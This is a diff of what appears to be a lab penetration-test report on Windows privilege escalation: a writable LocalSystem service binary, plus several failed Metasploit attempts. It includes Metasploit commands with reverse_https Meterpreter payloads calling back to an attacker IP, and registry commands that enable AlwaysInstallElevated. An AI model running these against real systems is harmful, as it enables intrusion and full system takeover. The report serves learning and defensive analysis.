@@ -361,7 +361,7 @@ File Integrity Verification
 
 **Reference:** CWE-732 — Incorrect Permission Assignment for Critical Resource. This is a configuration vulnerability rather than a software flaw (Or what would be a CVE). No CVE applies as the weakness is the result of administrator misconfiguration rather than a vendor bug.
 
-**Root Cause:** The service `VulnSvc` was configured to run under the `LocalSystem` account — the highest privilege context on a Windows host. The followign two misconfigurations made it exploitable by a standard user. First, the service binary directory `C:\VulnService\` had its ACL set to grant `Everyone` full control `(OI)(CI)F`. This allows any authenticated user to overwrite the service binary. Second, the service DACL was modified to grant `Everyone` start and stop permissions. This allows a standard user to restart the service and trigger execution of the replaced binary. Together these misconfigurations allowed a standard user to replace the binary that `LocalSystem` executes, then trigger that execution which is a writable service binary privilege escalation path.
+**Root Cause:** The service `VulnSvc` was configured to run under the `LocalSystem` account — the highest privilege context on a Windows host. The followign two misconfigurations made it exploitable by a standard user. First, the service binary directory `C:\VulnService\` had its ACL set to grant `Everyone` full control `(OI)(CI)F`. This allows any authenticated user to overwrite the service binary. Second, the service DACL was modified to grant `Everyone` start and stop permissions. This allows a standard user to restart the service and trigger execution of the replaced binary. Together these misconfigurations allowed a standard user to replace the binary that `LocalSystem` executes, then trigger that execution which is a writable service binary privilege escalation path. This was service was found by the enum.bat script in Phase 2 where it runs sc query which lists all running services on the target.
 
 **Exploit Mechanism:**
  
@@ -408,7 +408,6 @@ Server username: NT AUTHORITY\SYSTEM
 
 <img width="1460" height="296" alt="image" src="https://github.com/user-attachments/assets/c6747a55-a782-43d2-a6de-36f4e155928e" />
 
- 
 ---
  
 ## Verification — Volume Shadow Copy
@@ -423,6 +422,8 @@ vssadmin list shadows
 <img width="931" height="594" alt="image" src="https://github.com/user-attachments/assets/862b0a8b-5f7e-45ff-887e-ad8f97ec053e" />
  
 The `ReturnValue: 0` confirms successful creation. The `vssadmin list shadows` output shows the shadow copy set ID, creation timestamp, originating machine (`DESKTOP-H53BPAA`), and type (`ClientAccessible`), confirming unrestricted SYSTEM-level access on the target host.
+
+
 
 ### Phase 5: Log Analysis
 **Sysmon Event ID 1 Findings:**
@@ -470,7 +471,7 @@ The module scanned 69 potential vectors against the target running Windows 10 Pr
 
 *[Screenshot: local_exploit_suggester output]*
 
----
+
 
 ## Exploitation Attempts
 
@@ -483,12 +484,9 @@ set LPORT 15000
 set payload windows/x64/meterpreter/reverse_https
 run
 ```
-
 **Result:** Exploit launched `notepad.exe` as the injection host and reflectively injected a DLL into the process. New Meterpreter sessions were opened however all sessions returned `DESKTOP-H53BPAA\Apollo` on `getuid`. The kernel driver exploitation completed the DLL injection but failed to elevate the process token to SYSTEM. `getsystem` was attempted on all resulting sessions and failed with error 1346.
 
 **Root Cause of Failure:** The Metasploit implementation of CVE-2024-35250 failed to complete the token privilege escalation step on Build 19045.6456. The exploit confirmed vulnerability via ks.sys presence but the token swap did not complete.
-
----
 
 ### Attempt 2: CVE-2023-36874 (Windows Error Reporting)
 ```bash
@@ -499,10 +497,7 @@ set LPORT 15000
 set payload windows/x64/meterpreter/reverse_https
 run
 ```
-
 **Result:** Exploit completed but no session was created. A warning indicated manual deletion of artifacts may be required (`C:\LNGswdqjGJuWs`). The Windows Error Reporting service did not behave as expected for the exploit to complete.
-
----
 
 ### Attempt 3: bypassuac_fodhelper
 ```bash
@@ -513,12 +508,9 @@ set LPORT 15000
 set payload windows/x64/meterpreter/reverse_https
 run
 ```
-
 **Result:** `Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module.`
 
 **Root Cause of Failure:** UAC bypass modules require the user to already be a member of the local Administrators group. Apollo is a standard user with no administrative privileges, making all UAC bypass techniques inapplicable.
-
----
 
 ### Attempt 4: bypassuac_dotnet_profiler
 ```bash
@@ -529,10 +521,7 @@ set LPORT 15000
 set payload windows/x64/meterpreter/reverse_https
 run
 ```
-
 **Result:** Failed for the same reason as fodhelper — Apollo is not in the local Administrators group. UAC bypass techniques require existing administrative group membership to function.
-
----
 
 ### Attempt 5: ms16_032_secondary_logon_handle_privesc
 ```bash
@@ -542,27 +531,7 @@ set LHOST 192.168.92.136
 set LPORT 15000
 run
 ```
-
 **Result:** Module only supports x86 architecture. Target is x64. Incompatible architecture — module not applicable.
-
----
-
-### Attempt 6: GodPotato
-Uploaded `GodPotato.exe` to `C:\temp\` and executed:
-```cmd
-C:\temp\GodPotato.exe -cmd "cmd /c whoami"
-```
-
-**Result:** 
-```
-CurrentUser: NT AUTHORITY\NETWORK SERVICE
-Find System Token: False
-Cannot create process Win32Error:1314
-```
-
-**Root Cause of Failure:** GodPotato requires `SeImpersonatePrivilege` to perform token impersonation. Apollo's token only contains 5 basic privileges with no impersonation capability, making all potato-based escalation techniques inapplicable.
-
----
 
 ### Attempt 7: AlwaysInstallElevated (Module)
 Registry keys were configured to enable AlwaysInstallElevated:
@@ -570,7 +539,6 @@ Registry keys were configured to enable AlwaysInstallElevated:
 reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
 reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
 ```
-
 Both keys confirmed set to `0x1`. Metasploit module executed:
 ```bash
 use exploit/windows/local/always_install_elevated
@@ -580,10 +548,7 @@ set LPORT 15000
 set payload windows/x64/meterpreter/reverse_https
 run
 ```
-
 **Result:** New session opened but returned `DESKTOP-H53BPAA\Apollo` on `getuid`. `getsystem` failed on resulting session.
-
----
 
 ### Attempt 8: AlwaysInstallElevated (Manual MSI)
 ```bash
